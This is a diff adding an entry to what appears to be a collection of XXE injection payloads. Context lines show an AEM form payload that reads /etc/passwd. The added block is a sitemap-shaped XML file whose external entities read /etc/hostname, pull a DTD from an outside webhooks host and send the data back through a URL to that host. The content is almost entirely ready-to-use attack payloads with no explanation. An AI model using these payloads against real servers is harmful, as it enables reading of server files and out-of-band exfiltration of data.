@@ -41,6 +41,25 @@
   ```bash
   guideState={"guideState"%3a{"guideDom"%3a{},"guideContext"%3a{"xsdRef"%3a"","guidePrefillXml"%3a"<%3fxml+version%3d\"1.0\"+encoding%3d\"utf-8\"%3f><!DOCTYPE+afData+[<!ENTITY+a+SYSTEM+\"file%3a///etc/passwd\">]><afData>%26a%3b</afData>"}}}
   ```
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE urlset [
+ <!ENTITY % goodies SYSTEM "file:///etc/hostname">
+ <!ENTITY % dtd SYSTEM "http://dtd.webhooks.pw/files/combine.dtd">
+%dtd;
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+    <url>
+        <loc>http://location.webhooks.pw/resp/&xxe;</loc>
+        <lastmod>2006-11-18</lastmod>
+        <changefreq>daily</changefreq>
+        <priority>0.8</priority>
+    </url>
+</urlset>
+```
+
 
 ---
 
